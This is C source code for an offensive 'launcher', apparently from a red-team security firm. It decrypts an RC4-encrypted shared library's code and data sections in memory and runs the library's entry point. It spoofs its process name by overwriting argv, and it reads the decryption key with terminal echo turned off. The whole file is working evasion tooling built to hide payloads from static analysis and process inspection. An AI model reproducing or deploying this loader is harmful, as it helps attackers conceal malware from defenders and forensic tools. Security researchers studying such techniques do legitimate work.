/*
 * golden_frieza_launcher_v3.c
 * Coded by: Marco Ortisi - RedTimmy Security
 *
 * Compile with:
 * gcc golden_frieza_launcher_v3.c -o golden_frieza_launcher_v3 -ldl
 *
 * */
#include <stdlib.h>
#include <stdio.h>
#include <dlfcn.h>
#include <unistd.h>
#include <sys/types.h>
#include <libgen.h>
#include <string.h>
#include <sys/mman.h>
#include <termios.h>

// RC4 function ripped from: https://github.com/kmohamed2020/rc4
void RC4(unsigned char* data, long dataLen, unsigned char* key, long keyLen,unsigned char* result)
/*
 * Function to encrypt data represented in array of char "data" with length represented in dataLen
 * using key which is represented in "Key" with length represented in "keyLen", and result will be
 * stored in result
 *
*/
{
    unsigned char T[256];
    unsigned char S[256];
    unsigned char  tmp; // to be used in swaping
    int j = 0,t= 0,i= 0;


    /* S & K initialization */
    for(int i = 0 ; i < 256 ; i++)
    {
        S[i]=i;
        T[i]= key[i % keyLen];
    }
    /* State Permutation */
    for(int i = 0 ; i < 256; i++)
    {
        j = ( j + S[i] + T[i] ) % 256;

        //Swap S[i] & S[j]
        tmp = S[j];
        S[j]= S[i];
        S[i] = tmp;
    }
    j =0; // reintializing j to reuse it
    for(int x = 0 ; x< dataLen ; x++)
    {
        i = (i+1) % 256; // using %256 to avoid exceed the array limit
        j = (j + S[i])% 256; // using %256 to avoid exceed the array limit

        //Swap S[i] & S[j]
        tmp = S[j];
        S[j]= S[i];
        S[i] = tmp;

        t = (S[i] + S[j]) % 256;

        // XOR generated S[t] with Byte from the plaintext/cipher and append each
        // Encrypted/Decrypted byte to result array
        result[x]= data[x]^S[t];
    }
}

int main(int argc, char **argv)
{
        /* paramater acquisition */
        char cmdline[256];
        char *aargv[argc+1];
        char *key;
        char *f_ps;
        short port;
        int offset = 0, len = 0, rodata_offset = 0, rodata_len = 0;
        int argvlen = strlen(argv[0]);
        int i, j;
        struct termios oflags, nflags;

        /* encrypted module loading */
        void *handle;

        /* pid and /proc/pid/maps reading */
        char line[256];
        char proc_path[32];
        int ret;
        unsigned long start_address = 0, end_address = 0;
        pid_t ppid;
        char *module_name;
        FILE *f;

        /* extract memory into a buffer in order to decrypt it */
        char *enc_buffer;
        char *rodata_enc_buffer;
        int n;

        /* transfer control to final destination */
        void (*testalo)();

        /* other */
        char *error;

        /* fake argv old school trick */
        if (argc < 3)
        {
                fprintf(stderr, "A parameter is needed from command line\n");
                exit(-1);
        }

        for(i = 0; i < argc; i++)
        {
                aargv[i] = malloc(strlen(argv[i]) + 1);
                strncpy(aargv[i], argv[i], strlen(argv[i]) + 1);
        }

        aargv[argc] = NULL;
        f_ps = aargv[2];
        if (argvlen < strlen(f_ps))
        {
                fprintf(stderr, "you are a stupid guy\n");
                exit(-1);
        }

        strncpy(argv[0], f_ps, strlen(f_ps));
        for(i = strlen(f_ps); i < argvlen; i++)
                argv[0][i] = '\0';

        for(i = 1; i < argc; i++)
        {
                argvlen = strlen(argv[i]);

                for(j = 0; j <= argvlen; j++)
                        argv[i][j] = '\0';
        }

        /***************************************************************
         *  PARAMETERS ACQUISITION
         **************************************************************/
        /* Offset and Len in the binary */
        printf("Enter .text offset and len in hex (0xXX): ");
        scanf("%x %x", &offset, &len);
        printf("Offset is %d bytes\n", offset);
        printf("Len is %d bytes\n", len);
        getchar();

        printf("Enter .rodata offset and len in hex (0xXX): ");
        scanf("%x %x", &rodata_offset, &rodata_len);
        printf(".rodata offset is %d bytes\n", rodata_offset);
        printf(".rodata len is %d bytes\n", rodata_len);
        getchar();

        /* Cmdline if any */
        printf("\nEnter cmdline: ");
        scanf("%hd", &port);
        getchar();
        printf("Cmdline is: %hd\n", port);

        /* key */
        key = calloc(256, sizeof(char));
        if (!key)
        {
                fprintf(stderr, "memory error\n");
                exit(-1);
        }

        /* disabling echo */
        tcgetattr(fileno(stdin), &oflags);
        nflags = oflags;
        nflags.c_lflag &= ~ECHO;
        nflags.c_lflag |= ECHONL;

        if (tcsetattr(fileno(stdin), TCSANOW, &nflags) != 0)
        {
                fprintf(stderr, "tcsetattr\n");
                exit(-1);
        }

        printf("Enter key: ");
        scanf("%16s", key);

        /* restore terminal */
        if (tcsetattr(fileno(stdin), TCSANOW, &oflags) != 0)
        {
                fprintf(stderr, "tcsetattr\n");
                exit(-1);
        }

        /******************************************************************
         * ENCRYPTED MODULE LOADING
         *****************************************************************/
        /* Load the encrypted module in memory */
        handle = dlopen (aargv[1], RTLD_LAZY);
        if (!handle) {
            fputs(dlerror(), stderr);
            fputs("\n", stderr);
            exit(1);
        }

        /*****************************************************************
         * PID AND /PROC/PID/MAPS READING
         ****************************************************************/

        ppid = getpid();
        printf("PID is: %d\n", ppid);
        snprintf(proc_path, sizeof(proc_path)-1, "/proc/%d/maps", ppid);

        f = fopen(proc_path, "r");
        if (!f)
        {
                fprintf(stderr, "Unable to open memory mapping file\n");
                exit(-1);
        }

        module_name = basename(aargv[1]);
        printf("Module name is: %s\n", module_name);

        while (fgets(line, 256, f) != NULL)
        {
                if (strstr(line, module_name))
                {
                        printf("%s", line);
                        sscanf(line, "%p-%p", (void **)&start_address, (void **)&end_address);
                        break;
                }
        }
        fclose(f);

        if (start_address == 0 || end_address == 0)
        {
                fprintf(stderr, "Module %s not mapped\n", module_name);
                exit(-1);
        }
        printf("Start address is: %p\n", (void *)start_address);
        printf("End address is %p\n", (void *)end_address);

        /**********************************************************************
         * EXTRACT MEMORY INTO A BUFFER IN ORDER TO DECRYPT IT
         *********************************************************************/

        /* copy encrypted text from module to memory */
        enc_buffer = (char *)malloc(len+1);
        if (!enc_buffer)
        {
                fprintf(stderr, "malloc error\n");
                exit(-1);
        }
        memset(enc_buffer, '\0', len+1);
        memcpy(enc_buffer, (void *)start_address+offset, len);

        rodata_enc_buffer = (char *)malloc(rodata_len+1);
        memset(rodata_enc_buffer, '\0', rodata_len+1);
        memcpy(rodata_enc_buffer, (void *)start_address+rodata_offset, rodata_len);

        /* mark start_address up to end_address as writable */
        n = end_address - start_address;
        //printf("difference: %d\n", n);

        if (mprotect((void *)start_address, n, PROT_READ | PROT_WRITE | PROT_EXEC) == -1)
        {
                fprintf(stderr, "mprotect() error\n");
                exit(-1);
        }

        /* decryption */
        RC4(enc_buffer, len, key, strlen(key), (void *)start_address+offset);
        free(enc_buffer);

        RC4(rodata_enc_buffer, rodata_len, key, strlen(key), (void *)start_address+rodata_offset);
        memset(key, '\0', strlen(key));
        free(rodata_enc_buffer);

        /* mark memory not writable again */
        if (mprotect((void *)start_address, n, PROT_READ | PROT_EXEC) == -1)
        {
                fprintf(stderr, "mprotect() error\n");
                exit(-1);
        }

        /***************************************************************************************
         * TRANSFER CONTROL TO FINAL DESTINATION
         **************************************************************************************/

        /* paramater part to be implemented */
        testalo = dlsym(handle, "testalo");
        if ((error = dlerror()) != NULL)  {
            fputs(error, stderr);
            exit(1);
        }
        printf("\nExecution of .text\n==================\n");
        testalo(port);
        dlclose(handle);
}
